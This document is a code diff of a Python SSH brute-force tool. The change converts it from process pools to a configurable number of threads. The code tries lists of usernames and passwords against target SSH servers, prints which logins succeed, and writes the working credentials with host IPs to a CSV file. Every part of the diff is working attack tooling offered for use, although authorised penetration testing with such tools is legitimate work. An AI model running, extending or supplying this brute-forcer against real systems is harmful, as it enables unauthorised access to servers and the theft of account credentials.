@@ -4,7 +4,7 @@ import paramiko
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
-from multiprocessing import Lock, Pool, cpu_count
+from threading import Thread, Lock
 from time import strftime, localtime, time
 
 status_color = {
@@ -23,6 +23,10 @@ def get_arguments(*args):
     for arg in args:
         parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
     return parser.parse_args()[0]
+
+lock = Lock()
+thread_count = 10
+successful_logins = []
 
 port = 22
 ignore_errors = True
@@ -48,43 +52,34 @@ def login(ssh_server, port, user, password):
     except Exception as err:
         t2 = time()
         return err, '', t2-t1
-def brute_force(process_index, ssh_servers, port, credentials):
-    successful_logins = []
+def brute_force(thread_index, ssh_servers, port, credentials):
     for credential in credentials:
         for ssh_server in ssh_servers:
             status = ['']
             while status[0] != True and status[0] != False:
                 status = login(ssh_server, port, credential[0], credential[1])
                 if status[0] == True:
-                    successful_logins.append([ssh_server, credential, status[1]])
                     with lock:
-                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
+                        successful_logins.append([ssh_server, credential, status[1]])
+                        display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
                 elif status[0] == False:
                     with lock:
-                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+                        display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
                 else:
                     with lock:
-                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+                        display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
                     if ignore_errors:
                         break
-    return successful_logins
-def main(servers, port, credentials):
-    successful_logins = []
-    process_count = cpu_count()
-    pool = Pool(process_count)
-    display('+', f"Starting {Back.MAGENTA}{process_count} Brute Force Processes{Back.RESET}")
-    display(':', f"Credentials / Processes = {Back.MAGENTA}{len(credentials)//process_count}{Back.RESET}")
-    processes = []
+def main(servers, port, credentials, threads_count):
+    display('+', f"Starting {Back.MAGENTA}{threads_count} Brute Force Threads{Back.RESET}")
     total_servers = len(servers)
-    server_divisions = [servers[group*total_servers//process_count: (group+1)*total_servers//process_count] for group in range(process_count)]
-    for index, server_division in enumerate(server_divisions):
-        processes.append(pool.apply_async(brute_force, (index, server_division, port, credentials, )))
-    for process in processes:
-        successful_logins.extend(process.get())
-    pool.close()
-    pool.join()
-    display('+', f"Processes Finished Excuting")
-    return successful_logins
+    threads = []
+    for thread_index in range(threads_count):
+        threads.append(Thread(target=brute_force, args=(thread_index, servers[thread_index*total_servers//threads_count: (thread_index+1)*total_servers//threads_count], port, credentials)))
+        threads[-1].start()
+    for thread in threads:
+        thread.join()
+    display('+', f"Threads Finished Excuting")
 
 if __name__ == "__main__":
     arguments = get_arguments(('-s', "--server", "server", "Target SSH Servers (seperated by ',' or File Name)"),
@@ -93,6 +88,7 @@ if __name__ == "__main__":
                               ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                               ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
                               ('-i', "--ignore-errors", "ignore_errors", f"Ignore Errors (True/False, Default={ignore_errors})"),
+                              ('-t', "--threads", "threads", f"Number of Threads to Run (Default={thread_count})"),
                               ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
     if not arguments.server:
         display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
@@ -150,18 +146,20 @@ if __name__ == "__main__":
             exit(0)
     if arguments.ignore_errors == False:
         ignore_errors = False
+    arguments.threads = int(arguments.threads) if arguments.threads else thread_count
     if not arguments.write:
         arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
     t1 = time()
-    successful_logins = main(arguments.server, arguments.port, arguments.credentials)
+    main(arguments.server, arguments.port, arguments.credentials, arguments.threads)
     t2 = time()
     display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
     display(':', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
     display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
     display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
-    display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
-    with open(arguments.write, 'w') as file:
-        file.write(f"IP,Hostname,User,Password\n")
-        file.write('\n'.join(f"{ip},{hostname},{username},{password}" for ip, (username, password), hostname in successful_logins))
-    display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
+    if len(successful_logins) > 0:
+        display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
+        with open(arguments.write, 'w') as file:
+            file.write(f"IP,Hostname,User,Password\n")
+            file.write('\n'.join(f"{ip},{hostname},{username},{password}" for ip, (username, password), hostname in successful_logins))
+        display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
